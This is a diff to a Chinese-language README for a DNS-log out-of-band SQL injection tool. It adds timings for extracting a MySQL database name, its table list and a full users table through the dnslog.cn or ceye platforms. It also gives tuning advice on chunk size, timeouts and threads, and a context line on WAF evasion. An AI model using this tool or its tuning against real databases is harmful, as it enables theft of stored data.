@@ -47,6 +47,25 @@ python3 dnslogsqlinj3.py --token TOKEN --ident IDENT --dbms mysql \
 - **平台**：`dnslog.cn` / `ceye`（`--token --ident`）/ `dnsloggo`（`--base --token`）/ `cmd`（自定义命令）
 - **参数**：`--prefix`（默认 `AND `）、`--encode auto|strict`、`--chunk`、`--http-timeout`、`--sleep-delay`、`--samples`
 
+## 速度
+
+实测（同一台 Windows + MySQL，ceye）：
+
+| 场景 | 耗时 |
+|---|---|
+| `select database()` 8 字节 | 2.6 秒 |
+| 爆表 29 字节 | 3.3 秒 |
+| users 全表 188 字节 | 22.9 秒 |
+
+三个参数决定速度，默认值已经调好：
+
+| 参数 | 默认 | 说明 |
+|---|---|---|
+| `--http-timeout` | 3 | UNC 会让请求挂在 SMB 连接上，DNS 早发出了。3 秒掐断即可，设 15 反而慢 5 倍 |
+| `--chunk` | 30 | hex 后 60 字符，卡在 DNS label 63 上限内。45 视平台可试，60 以上域名过长会失败 |
+| `--poll` | 1 | 平台轮询间隔 |
+| `--threads` | 1 | 并发块数，默认 1；目标 Apache worker 少时并发会被排队，反而更慢 |
+
 ## 踩过的坑（已内置）
 
 1. 全量 URL 编码把 `/ " ( )` 变成 `%2F %22 %28`，会被部分 WAF 断连 → 默认只编码空格与 `& # % +`。
